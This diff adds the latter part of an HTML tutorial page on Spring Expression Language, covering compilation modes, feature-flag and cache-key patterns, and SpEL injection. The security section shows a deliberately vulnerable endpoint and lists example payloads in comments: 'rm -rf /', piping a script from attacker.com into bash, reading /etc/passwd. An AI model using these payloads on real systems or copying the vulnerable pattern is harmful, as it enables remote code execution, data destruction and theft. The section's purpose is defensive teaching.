+<span class="token-comment">// Configure globally via SpelParserConfiguration</span>
+<span class="token-type">SpelParserConfiguration</span> config = <span class="token-keyword">new</span> <span class="token-type">SpelParserConfiguration</span>(
+    <span class="token-type">SpelCompilerMode</span>.MIXED,    <span class="token-comment">// Compile hot expressions</span>
+    <span class="token-keyword">this</span>.<span class="token-function">getClass</span>().<span class="token-function">getClassLoader</span>()
+);
+<span class="token-type">ExpressionParser</span> parser = <span class="token-keyword">new</span> <span class="token-type">SpelExpressionParser</span>(config);
+
+<span class="token-comment">// Or configure in application.properties (Spring Boot)</span>
+<span class="token-comment">// spring.expression.compiler.mode=MIXED</span>
+
+<span class="token-comment">// What gets compiled?</span>
+<span class="token-comment">// ✅ Property access: user.name</span>
+<span class="token-comment">// ✅ Method calls: user.getName()</span>
+<span class="token-comment">// ✅ Arithmetic: a + b * c</span>
+<span class="token-comment">// ✅ Comparisons: age > 18</span>
+<span class="token-comment">// ❌ Collection selection: .?[...] (too dynamic)</span>
+<span class="token-comment">// ❌ Bean references: @beanName (requires context lookup)</span>
+<span class="token-comment">// ❌ Safe navigation: ?. (null check can't be compiled away)</span></code></pre>
+
+            <div class="understanding-section">
+                <h3>🧠 Interpreted vs Compiled Performance</h3>
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Mode</th>
+                            <th>First Eval</th>
+                            <th>Subsequent Evals</th>
+                            <th>Error Handling</th>
+                            <th>Best For</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>OFF</strong> (interpreted)</td>
+                            <td>~1μs</td>
+                            <td>~1μs</td>
+                            <td>✅ Full SpEL error messages</td>
+                            <td>Low-frequency expressions</td>
+                        </tr>
+                        <tr>
+                            <td><strong>IMMEDIATE</strong></td>
+                            <td>~5ms (compilation)</td>
+                            <td>~10ns (bytecode)</td>
+                            <td>⚠️ Fails permanently on compile error</td>
+                            <td>Predictable hot paths</td>
+                        </tr>
+                        <tr>
+                            <td><strong>MIXED</strong></td>
+                            <td>~1μs (interpreted)</td>
+                            <td>~10ns (after compile)</td>
+                            <td>✅ Falls back to interpreted on error</td>
+                            <td>Production — safe + fast</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="callout callout-info">
+                <div class="callout-title">💡 How Compilation Works</div>
+                <p>SpEL generates bytecode using ASM (same library Spring uses for CGLIB proxies). Each compiled expression becomes a class implementing <code>CompiledExpression</code>. The bytecode directly invokes methods/accesses fields without reflective overhead — similar performance to hand-written Java code.</p>
+            </div>
+
+            <!-- ============================================ -->
+            <!-- SECTION 10: SECURITY — SpEL Injection -->
+            <!-- ============================================ -->
+            <h2>10. SECURITY: SpEL Injection Vulnerabilities</h2>
+
+            <div class="callout callout-danger">
+                <div class="callout-title">🚨 CRITICAL SECURITY: Never Evaluate User Input as SpEL</div>
+                <p>SpEL injection is a <strong>Remote Code Execution (RCE)</strong> vulnerability. If an attacker can control a SpEL expression evaluated with <code>StandardEvaluationContext</code>, they can execute arbitrary system commands, read files, or exfiltrate data. This is as severe as SQL injection.</p>
+            </div>
+
+            <pre><code><span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// ❌ VULNERABLE CODE — Remote Code Execution via SpEL Injection</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-annotation">@PostMapping</span>(<span class="token-string">"/search"</span>)
+<span class="token-keyword">public</span> <span class="token-type">List</span>&lt;<span class="token-type">Product</span>&gt; <span class="token-function">search</span>(<span class="token-annotation">@RequestParam</span> <span class="token-type">String</span> filter) {
+    <span class="token-comment">// DANGER: User-controlled input evaluated as SpEL!</span>
+    <span class="token-type">ExpressionParser</span> parser = <span class="token-keyword">new</span> <span class="token-type">SpelExpressionParser</span>();
+    <span class="token-type">StandardEvaluationContext</span> ctx = <span class="token-keyword">new</span> <span class="token-type">StandardEvaluationContext</span>(products);
+
+    <span class="token-comment">// Attacker sends: T(java.lang.Runtime).getRuntime().exec('rm -rf /')</span>
+    <span class="token-type">Expression</span> exp = parser.<span class="token-function">parseExpression</span>(filter); <span class="token-comment">// ← RCE HERE</span>
+    <span class="token-keyword">return</span> exp.<span class="token-function">getValue</span>(ctx, <span class="token-type">List</span>.<span class="token-keyword">class</span>);
+}
+
+<span class="token-comment">// Exploit payloads an attacker might use:</span>
+<span class="token-comment">// T(java.lang.Runtime).getRuntime().exec('curl attacker.com/shell.sh | bash')</span>
+<span class="token-comment">// new java.io.BufferedReader(new java.io.InputStreamReader(</span>
+<span class="token-comment">//   T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()))</span>
+<span class="token-comment">//   .readLine()</span>
+<span class="token-comment">// T(java.lang.System).getenv()</span>
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// ✅ SAFE: Use SimpleEvaluationContext to restrict capabilities</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-annotation">@PostMapping</span>(<span class="token-string">"/search"</span>)
+<span class="token-keyword">public</span> <span class="token-type">List</span>&lt;<span class="token-type">Product</span>&gt; <span class="token-function">search</span>(<span class="token-annotation">@RequestParam</span> <span class="token-type">String</span> filter) {
+    <span class="token-type">ExpressionParser</span> parser = <span class="token-keyword">new</span> <span class="token-type">SpelExpressionParser</span>();
+
+    <span class="token-comment">// SimpleEvaluationContext BLOCKS:</span>
+    <span class="token-comment">// ✗ T() type references — no static method access</span>
+    <span class="token-comment">// ✗ new — no constructor calls</span>
+    <span class="token-comment">// ✗ Bean references — no @beanName access</span>
+    <span class="token-comment">// ✗ Arbitrary method calls (unless explicitly whitelisted)</span>
+    <span class="token-type">SimpleEvaluationContext</span> ctx = <span class="token-type">SimpleEvaluationContext</span>
+        .<span class="token-function">forReadOnlyDataBinding</span>()          <span class="token-comment">// Only property reads</span>
+        .<span class="token-function">withInstanceMethods</span>()              <span class="token-comment">// Allow safe instance methods</span>
+        .<span class="token-function">withRootObject</span>(productSearchDTO)
+        .<span class="token-function">build</span>();
+
+    <span class="token-type">Expression</span> exp = parser.<span class="token-function">parseExpression</span>(filter);
+    <span class="token-keyword">return</span> exp.<span class="token-function">getValue</span>(ctx, <span class="token-type">List</span>.<span class="token-keyword">class</span>);
+    <span class="token-comment">// Attacker's T(java.lang.Runtime)... will throw SpelEvaluationException</span>
+}
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// ✅ BEST: Don't evaluate user input as SpEL at all!</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-comment">// Use parameterized queries, Specification pattern, or Criteria API instead</span>
+<span class="token-annotation">@PostMapping</span>(<span class="token-string">"/search"</span>)
+<span class="token-keyword">public</span> <span class="token-type">List</span>&lt;<span class="token-type">Product</span>&gt; <span class="token-function">search</span>(<span class="token-annotation">@RequestBody</span> <span class="token-type">SearchCriteria</span> criteria) {
+    <span class="token-keyword">return</span> productRepository.<span class="token-function">findAll</span>(criteria.<span class="token-function">toSpecification</span>());
+}</code></pre>
+
+            <!-- ============================================ -->
+            <!-- SECTION 11: Dynamic Feature Flags -->
+            <!-- ============================================ -->
+            <h2>11. Industry Pattern: Dynamic Feature Flags with SpEL</h2>
+
+            <pre><code><span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Custom @FeatureFlag annotation with SpEL condition</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-annotation">@Target</span>(<span class="token-type">ElementType</span>.METHOD)
+<span class="token-annotation">@Retention</span>(<span class="token-type">RetentionPolicy</span>.RUNTIME)
+<span class="token-keyword">public</span> <span class="token-annotation">@interface</span> <span class="token-class">FeatureFlag</span> {
+    <span class="token-type">String</span> <span class="token-function">value</span>();             <span class="token-comment">// Feature flag name</span>
+    <span class="token-type">String</span> <span class="token-function">condition</span>() <span class="token-keyword">default</span> <span class="token-string">""</span>;  <span class="token-comment">// SpEL condition for gradual rollout</span>
+    <span class="token-type">String</span> <span class="token-function">fallbackMethod</span>() <span class="token-keyword">default</span> <span class="token-string">""</span>;
+}
+
+<span class="token-comment">// AOP Aspect that evaluates the SpEL condition</span>
+<span class="token-annotation">@Aspect</span>
+<span class="token-annotation">@Component</span>
+<span class="token-keyword">public class</span> <span class="token-class">FeatureFlagAspect</span> {
+
+    <span class="token-keyword">private final</span> <span class="token-type">FeatureFlagService</span> flagService;
+    <span class="token-keyword">private final</span> <span class="token-type">ExpressionParser</span> parser = <span class="token-keyword">new</span> <span class="token-type">SpelExpressionParser</span>();
+
+    <span class="token-annotation">@Around</span>(<span class="token-string">"@annotation(featureFlag)"</span>)
+    <span class="token-keyword">public</span> <span class="token-type">Object</span> <span class="token-function">checkFeatureFlag</span>(<span class="token-type">ProceedingJoinPoint</span> pjp, <span class="token-type">FeatureFlag</span> featureFlag) <span class="token-keyword">throws</span> <span class="token-type">Throwable</span> {
+
+        <span class="token-comment">// Check if feature is globally enabled</span>
+        <span class="token-keyword">if</span> (!flagService.<span class="token-function">isEnabled</span>(featureFlag.<span class="token-function">value</span>())) {
+            <span class="token-keyword">return</span> <span class="token-function">invokeFallback</span>(pjp, featureFlag);
+        }
+
+        <span class="token-comment">// If there's a SpEL condition, evaluate it for gradual rollout</span>
+        <span class="token-keyword">if</span> (!featureFlag.<span class="token-function">condition</span>().<span class="token-function">isEmpty</span>()) {
+            <span class="token-type">StandardEvaluationContext</span> ctx = <span class="token-keyword">new</span> <span class="token-type">StandardEvaluationContext</span>();
+            ctx.<span class="token-function">setVariable</span>(<span class="token-string">"args"</span>, pjp.<span class="token-function">getArgs</span>());
+            ctx.<span class="token-function">setVariable</span>(<span class="token-string">"target"</span>, pjp.<span class="token-function">getTarget</span>());
+            ctx.<span class="token-function">setVariable</span>(<span class="token-string">"user"</span>, <span class="token-type">SecurityContextHolder</span>.<span class="token-function">getContext</span>()
+                .<span class="token-function">getAuthentication</span>().<span class="token-function">getPrincipal</span>());
+
+            <span class="token-type">Boolean</span> conditionMet = parser.<span class="token-function">parseExpression</span>(featureFlag.<span class="token-function">condition</span>())
+                .<span class="token-function">getValue</span>(ctx, <span class="token-type">Boolean</span>.<span class="token-keyword">class</span>);
+
+            <span class="token-keyword">if</span> (!<span class="token-type">Boolean</span>.TRUE.<span class="token-function">equals</span>(conditionMet)) {
+                <span class="token-keyword">return</span> <span class="token-function">invokeFallback</span>(pjp, featureFlag);
+            }
+        }
+
+        <span class="token-keyword">return</span> pjp.<span class="token-function">proceed</span>();
+    }
+}
+
+<span class="token-comment">// Usage: enable new checkout flow only for premium users with > 10 orders</span>
+<span class="token-annotation">@FeatureFlag</span>(
+    value = <span class="token-string">"new-checkout-flow"</span>,
+    condition = <span class="token-string">"#user.premium and #user.orderCount > 10"</span>,
+    fallbackMethod = <span class="token-string">"legacyCheckout"</span>
+)
+<span class="token-keyword">public</span> <span class="token-type">CheckoutResult</span> <span class="token-function">checkout</span>(<span class="token-type">Cart</span> cart) {
+    <span class="token-comment">// New implementation</span>
+}
+
+<span class="token-keyword">public</span> <span class="token-type">CheckoutResult</span> <span class="token-function">legacyCheckout</span>(<span class="token-type">Cart</span> cart) {
+    <span class="token-comment">// Old implementation (fallback)</span>
+}</code></pre>
+
+            <!-- ============================================ -->
+            <!-- SECTION 12: Complex Cache Key Generation -->
+            <!-- ============================================ -->
+            <h2>12. Industry Pattern: Complex Cache Key Generation</h2>
+
+            <pre><code><span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Basic SpEL cache keys</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-comment">// Simple parameter-based key</span>
+<span class="token-annotation">@Cacheable</span>(value = <span class="token-string">"products"</span>, key = <span class="token-string">"#productId"</span>)
+<span class="token-keyword">public</span> <span class="token-type">Product</span> <span class="token-function">findProduct</span>(<span class="token-type">Long</span> productId) { ... }
+
+<span class="token-comment">// Multi-parameter composite key</span>
+<span class="token-annotation">@Cacheable</span>(value = <span class="token-string">"search"</span>, key = <span class="token-string">"#query + '_' + #page + '_' + #size"</span>)
+<span class="token-keyword">public</span> <span class="token-type">Page</span>&lt;<span class="token-type">Product</span>&gt; <span class="token-function">search</span>(<span class="token-type">String</span> query, <span class="token-keyword">int</span> page, <span class="token-keyword">int</span> size) { ... }
+
+<span class="token-comment">// Object property-based key</span>
+<span class="token-annotation">@Cacheable</span>(value = <span class="token-string">"reports"</span>, key = <span class="token-string">"#criteria.startDate.toString() + '_' + #criteria.endDate.toString() + '_' + #criteria.region"</span>)
+<span class="token-keyword">public</span> <span class="token-type">Report</span> <span class="token-function">generateReport</span>(<span class="token-type">ReportCriteria</span> criteria) { ... }
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Advanced: Conditional caching with SpEL</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-comment">// Only cache if result is not null and has items</span>
+<span class="token-annotation">@Cacheable</span>(
+    value = <span class="token-string">"inventory"</span>,
+    key = <span class="token-string">"#warehouseId + '_' + #sku"</span>,
+    condition = <span class="token-string">"#warehouseId != null"</span>,       <span class="token-comment">// Don't attempt cache if null</span>
+    unless = <span class="token-string">"#result == null or #result.quantity == 0"</span>  <span class="token-comment">// Don't cache empty results</span>
+)
+<span class="token-keyword">public</span> <span class="token-type">InventoryItem</span> <span class="token-function">getStock</span>(<span class="token-type">String</span> warehouseId, <span class="token-type">String</span> sku) { ... }
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Custom KeyGenerator for complex scenarios</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-annotation">@Bean</span>
+<span class="token-keyword">public</span> <span class="token-type">KeyGenerator</span> <span class="token-function">tenantAwareCacheKeyGenerator</span>() {
+    <span class="token-keyword">return</span> (target, method, params) -&gt; {
+        <span class="token-type">String</span> tenantId = <span class="token-type">TenantContext</span>.<span class="token-function">getCurrentTenant</span>();
+        <span class="token-keyword">return</span> tenantId + <span class="token-string">":"</span> + method.<span class="token-function">getName</span>() + <span class="token-string">":"</span>
+            + <span class="token-type">Arrays</span>.<span class="token-function">deepHashCode</span>(params);
+    };
+}
+
+<span class="token-annotation">@Cacheable</span>(value = <span class="token-string">"tenantData"</span>, keyGenerator = <span class="token-string">"tenantAwareCacheKeyGenerator"</span>)
+<span class="token-keyword">public</span> <span class="token-type">TenantConfig</span> <span class="token-function">getTenantConfig</span>(<span class="token-type">String</span> configKey) { ... }
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// SpEL with #root in @Cacheable context</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-annotation">@Cacheable</span>(
+    value = <span class="token-string">"analytics"</span>,
+    key = <span class="token-string">"#root.target.class.simpleName + '.' + #root.methodName + '(' + #args[0] + ')'"</span>
+)
+<span class="token-keyword">public</span> <span class="token-type">AnalyticsReport</span> <span class="token-function">getReport</span>(<span class="token-type">String</span> reportType) { ... }
+<span class="token-comment">// Generated key: "AnalyticsService.getReport(revenue)"</span></code></pre>
+
+            <!-- ============================================ -->
+            <!-- SUMMARY -->
+            <!-- ============================================ -->
+            <div class="understanding-section">
+                <h3>🎯 Key Takeaways</h3>
+                <ul>
+                    <li><strong>SpEL Architecture</strong>: <code>SpelExpressionParser</code> → <code>Expression</code> (AST) → <code>EvaluationContext</code> → Result. Parser and Expression are thread-safe; contexts are not.</li>
+                    <li><strong>Two contexts</strong>: <code>StandardEvaluationContext</code> (full power, dangerous) vs <code>SimpleEvaluationContext</code> (restricted, safe for limited user input)</li>
+                    <li><strong>${...} ≠ #{...}</strong>: Placeholders are simple key lookups resolved by <code>PropertySourcesPlaceholderConfigurer</code>; SpEL is a full expression language resolved during injection. They combine: <code>#{${key} * 2}</code></li>
+                    <li><strong>Powerful operators</strong>: safe navigation (<code>?.</code>), Elvis (<code>?:</code>), <code>matches</code> (regex), <code>T()</code> (static access), collection selection (<code>.?[]</code>) and projection (<code>.![]</code>)</li>
+                    <li><strong>#root vs #this</strong>: <code>#root</code> always points to the evaluation root; <code>#this</code> changes to the current element inside collection operations</li>
+                    <li><strong>Compilation</strong>: Use <code>MIXED</code> mode for production — interprets first, compiles hot paths, falls back gracefully on errors</li>
+                    <li><strong>SECURITY</strong>: SpEL injection = RCE. NEVER evaluate user-controlled strings with <code>StandardEvaluationContext</code>. Use <code>SimpleEvaluationContext</code> or avoid SpEL for user input entirely.</li>
+                    <li><strong>Industry patterns</strong>: Feature flags with SpEL conditions for gradual rollout; complex cache key generation combining method metadata, parameters, and tenant context</li>
+                </ul>
+            </div>
+
+            <div class="nav-footer">
+                <a href="07-aop-internals.html" class="nav-btn nav-btn-prev">← AOP Internals</a>
+                <a href="09-springboot-application.html" class="nav-btn nav-btn-next">SpringBoot Application →</a>
+            </div>
+        </div>
+    </main>
+    <script src="script.js"></script>
+</body>
+</html>
